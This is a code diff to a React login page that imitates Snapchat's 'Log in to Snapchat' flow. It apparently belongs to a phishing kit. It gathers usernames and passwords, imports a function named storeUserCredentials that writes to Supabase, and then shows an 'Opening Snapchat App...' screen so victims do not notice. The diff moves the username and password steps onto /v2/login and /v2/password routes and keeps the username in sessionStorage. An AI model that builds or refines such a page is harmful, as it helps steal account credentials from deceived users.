@@ -1,15 +1,43 @@
 import { useState, useEffect } from 'react';
+import { useNavigate, useLocation } from 'react-router-dom';
 import { storeUserCredentials } from './lib/supabase';
 import './App.css';
 
 function App() {
+  const navigate = useNavigate();
+  const location = useLocation();
+
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
-  const [currentStep, setCurrentStep] = useState('username'); // 'username' | 'password' | 'opening' | 'success'
   const [isLoading, setIsLoading] = useState(false);
   const [isOpeningApp, setIsOpeningApp] = useState(false);
   const [errors, setErrors] = useState({});
+  const [showOpening, setShowOpening] = useState(false);
+
+  // Determine current step from URL path
+  const getCurrentStep = () => {
+    const path = location.pathname;
+    if (path.includes('/password') || path.includes('/v2/password')) {
+      return 'password';
+    }
+    return 'username';
+  };
+
+  const currentStep = getCurrentStep();
+
+  // Redirect to login if accessing password without username
+  useEffect(() => {
+    if (currentStep === 'password' && !username) {
+      // Check sessionStorage for username
+      const storedUsername = sessionStorage.getItem('snap_username');
+      if (storedUsername) {
+        setUsername(storedUsername);
+      } else {
+        navigate('/v2/login', { replace: true });
+      }
+    }
+  }, [currentStep, username, navigate]);
 
   // Update document title based on current step
   useEffect(() => {
@@ -29,11 +57,13 @@ function App() {
     // Show loading state with spinner
     setIsLoading(true);
 
-    // Simulate brief loading then proceed
+    // Store username in session and navigate to password page
+    sessionStorage.setItem('snap_username', username);
+
     setTimeout(() => {
       setIsLoading(false);
       setErrors({});
-      setCurrentStep('password');
+      navigate('/v2/password');
     }, 800);
   };
 
@@ -60,8 +90,7 @@ function App() {
 
       // Show "Opening Snapchat App..." state
       setIsLoading(false);
-      setCurrentStep('opening');
-      setIsOpeningApp(true);
+      setShowOpening(true);
 
       // Wait 5-6 seconds then try to open Snapchat app
       setTimeout(() => {
@@ -116,7 +145,9 @@ function App() {
       }
 
       // Clean up
-      document.body.removeChild(iframe);
+      if (document.body.contains(iframe)) {
+        document.body.removeChild(iframe);
+      }
     }, 2000);
   };
 
@@ -132,9 +163,10 @@ function App() {
   // Go back to username step ("Not you?" button)
   const handleNotYou = (e) => {
     e.preventDefault();
-    setCurrentStep('username');
     setPassword('');
     setErrors({});
+    sessionStorage.removeItem('snap_username');
+    navigate('/v2/login');
   };
 
   // Handle forgot password (placeholder for now)
@@ -176,12 +208,10 @@ function App() {
 
           {/* Page Title - Changes based on step */}
           <h1 className="login-title">
-            {currentStep === 'password' || currentStep === 'opening'
-              ? 'Enter Password'
-              : 'Log in to Snapchat'}
+            {currentStep === 'password' ? 'Enter Password' : 'Log in to Snapchat'}
           </h1>
 
-          {/* Username Step */}
+          {/* Username Step - /v2/login */}
           {currentStep === 'username' && (
             <form className="login-form fade-in" onSubmit={handleUsernameSubmit}>
               <div className="input-group">
@@ -216,8 +246,8 @@ function App() {
             </form>
           )}
 
-          {/* Password Step */}
-          {currentStep === 'password' && (
+          {/* Password Step - /v2/password */}
+          {currentStep === 'password' && !showOpening && (
             <form className="login-form fade-in" onSubmit={handlePasswordSubmit}>
               {/* Username display with "Not you?" link */}
               <div className="username-display">
@@ -270,7 +300,7 @@ function App() {
           )}
 
           {/* Opening Snapchat App State */}
-          {currentStep === 'opening' && (
+          {showOpening && (
             <div className="login-form fade-in">
               {/* Username display */}
               <div className="username-display">
@@ -283,28 +313,11 @@ function App() {
               </div>
             </div>
           )}
-
-          {/* Success Step (fallback) */}
-          {currentStep === 'success' && (
-            <div className="success-message fade-in">
-              <div className="success-icon">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
-                  <polyline points="22 4 12 14.01 9 11.01" />
-                </svg>
-              </div>
-              <h2 className="success-title">Login Successful!</h2>
-              <p className="success-text">
-                Welcome back, {username}!<br />
-                Redirecting you to Snapchat...
-              </p>
-            </div>
-          )}
         </div>
       </div>
 
       {/* Sign Up Section - OUTSIDE white container */}
-      {currentStep !== 'opening' && currentStep !== 'success' && (
+      {!showOpening && (
         <div className="signup-section">
           <span className="signup-text">New to Snapchat?</span>
           <a href="#signup" className="signup-link">Sign Up</a>
